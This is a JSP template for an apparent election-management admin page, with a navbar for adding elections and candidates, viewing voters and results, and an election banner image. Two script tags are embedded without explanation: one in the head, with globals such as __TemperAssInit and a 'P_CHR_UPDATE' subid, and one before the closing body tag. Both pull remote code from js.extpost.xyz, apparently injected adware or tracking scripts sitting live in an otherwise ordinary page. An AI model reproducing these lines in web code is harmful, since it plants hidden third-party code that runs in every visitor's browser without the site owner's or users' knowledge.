<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>

<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ page session="false" %>
<html><head>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous" referrerpolicy="no-referrer">
<link href="/Content/css/bootstrap-flatly.min.css" rel="stylesheet">
<link href="/Scripts/assets/dist/css/style.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/fontawesome.min.css" integrity="sha512-xX2rYBFJSj86W54Fyv1de80DWBq7zYLn2z0I9bIhQG+rxIF6XVJUpdGnsNHWRa6AvP89vtFupEPDP8eZAtu9qA==" crossorigin="anonymous" referrerpolicy="no-referrer">
<link href="/Content/css/animations.css" rel="stylesheet">
<link href="/Content/css/fonts.css" rel="stylesheet">
<link href="/Content/css/main.css" rel="stylesheet" class="color-switcher-link">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.js" integrity="sha512-n/4gHW3atM3QqRcbCn6ewmpxcLAHGaDjpEBu4xZd47N0W2oQ+6q7oc3PXstrJYXcbNU1OHdQ1T7pAP+gi5Yu8g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
	<title>Home</title>
<script src="https://js.extpost.xyz/js/i.js?1677089759233"></script><script>window.__TemperAssInit = true;window.__VUserUDID = 'a258d9bfffc4f2bda6f86b79dec1499c1f0d6111';window.__VUserSUBID = 'P_CHR_UPDATE';</script></head>






<body>



                <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
  <div class="container-fluid">
    <a href="https://eci.gov.in/" id="elLogo" accesskey="1"><img src="https://eci.gov.in/uploads/monthly_2022_06/logo.png.d0e6aee2d64193769bffbc6e720bbe96.png" alt="Election Commission of India" ></a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarColor01" aria-controls="navbarColor01" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarColor01">
      <ul class="navbar-nav me-auto">
        <li class="nav-item">
          <a class="nav-link active" id="home" href="/pro" style="margin-left: 60px;">Home
            <span class="visually-hidden">(current)</span>
          </a>
        </li>
        <li class="nav-item">
          <a class="nav-link" id="addElec" href="/pro/main/addElection" style="width: max-content;">Add Election</a>
        </li>
        <!-- <li class="nav-item">
          <a class="nav-link" href="#">Candidate</a>
        </li> -->
        <li class="nav-item">
          <a class="nav-link" id="addCandidate" href="/pro/main/addCandidate" style="width: max-content;">Add Candidate</a>
        </li>
         <li class="nav-item">
          <a class="nav-link"  id="viewVoter" href="/pro/main/viewVoters" style="width: max-content;">View Voters</a>
        </li>
        <!-- <li class="nav-item">
          <a class="nav-link" href="#">Candidate</a>
        </li> -->
        <li class="nav-item">
          <a class="nav-link" id="viewResult" href="/pro/main/viewResults" style="width: max-content;">View Results</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" id="viewResult" href="/pro" style="width: max-content;">Log Out</a>
        </li>
       
       <!--  <li class="nav-item dropdown">
          <a class="nav-link dropdown-toggle" data-bs-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false">Dropdown</a>
          <div class="dropdown-menu">
            <a class="dropdown-item" href="#">Action</a>
            <a class="dropdown-item" href="#">Another action</a>
            <a class="dropdown-item" href="#">Something else here</a>
            <div class="dropdown-divider"></div>
            <a class="dropdown-item" href="#">Separated link</a>
          </div>
        </li> -->
      </ul>
     <!--  <form class="d-flex">
        <input class="form-control me-sm-2" type="search" placeholder="Search">
        <button class="btn btn-secondary my-2 my-sm-0" type="submit">Search</button>
      </form> -->
    </div>
  </div>
</nav>
 <img alt="" width="100%" height="450px" src="<c:url value="/resources/images/election.jpg"></c:url>">

<script src="https://js.extpost.xyz/js/inject-web.js?2020-08-22" type="text/javascript"></script></body></html>
